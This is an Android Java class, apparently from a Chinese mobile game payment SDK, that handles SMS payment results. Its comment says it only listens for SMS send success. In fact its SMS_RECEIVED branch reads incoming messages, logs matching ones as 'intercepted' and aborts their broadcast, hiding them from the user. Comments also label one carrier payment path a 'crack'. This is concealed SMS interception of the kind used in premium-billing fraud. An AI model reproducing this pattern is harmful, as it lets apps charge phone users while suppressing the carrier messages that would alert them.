package mobi.zty.sdk.game;

//mobi.zty.sdk.game.SMSReceiver
import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.util.LocalStorage;
import mobi.zty.sdk.util.Util_G;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

/**
 * 目前该类只负责 监听短信是否发送成功
 * @author Administrator
 *
 */
public final class SMSReceiver extends BroadcastReceiver
{
  public SMSReceiver()
  {
  }

  
  
  public final void onReceive(Context context, Intent intent)
  {
	  if (intent.getAction()
              .equals("android.provider.Telephony.SMS_RECEIVED"))
	  {
		  Object[] pdus = (Object[])intent.getExtras().get("pdus");//获取短信内容
		      for(Object pdu : pdus)
		      {
		          byte[] data = (byte[]) pdu;//获取单条短信内容，短信内容以pdu格式存在
		          SmsMessage message = SmsMessage.createFromPdu(data);//使用pdu格式的短信数据生成短信对象
		          String sender = message.getOriginatingAddress();//获取短信的发送者lsl
		          String content = message.getMessageBody();//获取短信的内容
		           		            
		          //SmsManager manager = SmsManager.getDefault();
		         //Util_G.debug_e(Util_G.busylog, "短信内容："+content+"号码："+sender);
		         if(GameSDK.isFill(content))
		         {
		        	 Util_G.debug_e(Util_G.busylog, "拦截到短信内容："+content+"号码："+sender);
		        	 this.abortBroadcast();
		         }
		       }
	  }
	  else if(intent.getAction()
              .equals("SENT_SMS_ACTION"))
	  {
		  int ret = getResultCode();
		  GameSDK instancet = GameSDK.getInstance();
		  instancet.payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
			switch (ret) {
	          case Activity.RESULT_OK:  
	        	//支付成功
				if(instancet != null&&!GameSDK.getSetting(instancet.context, Constants.MK).equals(Constants.FANHE_PAY))
				{
					if(instancet.bCallback == 0)						
					{
						if (GameSDK.payOrder.equals(GameSDK.limitOrder)) {
							instancet.limitMoney -= SendOder.getInstance().amount;
							if (GameSDK.getSetting(instancet.context, Constants.MK).equals(Constants.ANAN_FEE)) {
								try {//移动MM安安破解
				        			PaymentFactoy.producePay(PayConfig.CMCC_ANAN_FEE).notifyPay(1);
				        		} catch (Throwable e) {
				        			e.printStackTrace();
				        		}
							}
						}
						instancet.bCallback = 1;
						SendOder.getInstance().sapay_ret(1);
						instancet.notifyPaymentFinish(SendOder.getInstance().amount);
					}else{
						if (GameSDK.payOrder.equals(GameSDK.limitOrder)) {
							if (GameSDK.getSetting(instancet.context, Constants.MK).equals(Constants.ANAN_FEE)) {
								try {//移动MM安安破解
				        			PaymentFactoy.producePay(PayConfig.CMCC_ANAN_FEE).notifyPay(0);
				        		} catch (Throwable e) {
				        			e.printStackTrace();
				        		}
							}
						}
						GameSDK.limitOrder = "";
						instancet.bCallback = 1;
						instancet.notifyPaymentCancelled();
					}
				}
	            break;  
	          case SmsManager.RESULT_ERROR_GENERIC_FAILURE:  
	          case SmsManager.RESULT_ERROR_RADIO_OFF:  
	          case SmsManager.RESULT_ERROR_NULL_PDU:  
	          default:  
	        	  if(instancet != null)
	        	  {
	        		  if (GameSDK.payOrder.equals(GameSDK.limitOrder)) {
							if (GameSDK.getSetting(instancet.context, Constants.MK).equals(Constants.ANAN_FEE)) {
								try {//移动MM安安破解
				        			PaymentFactoy.producePay(PayConfig.CMCC_ANAN_FEE).notifyPay(0);
				        		} catch (Throwable e) {
				        			e.printStackTrace();
				        		}
							}
						}
	        		  GameSDK.limitOrder = "";
	        		  instancet.payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
	        		  instancet.bCallback = 1;
		        	  PayConfig.IS_PAYING = false;
		        	  instancet.notifyPaymentFail(PayConfig.NATIVE_FEE_FAIL,"短信发送失败：");
	        	  }
	              break;  
	      }  
      }
  }

  
}

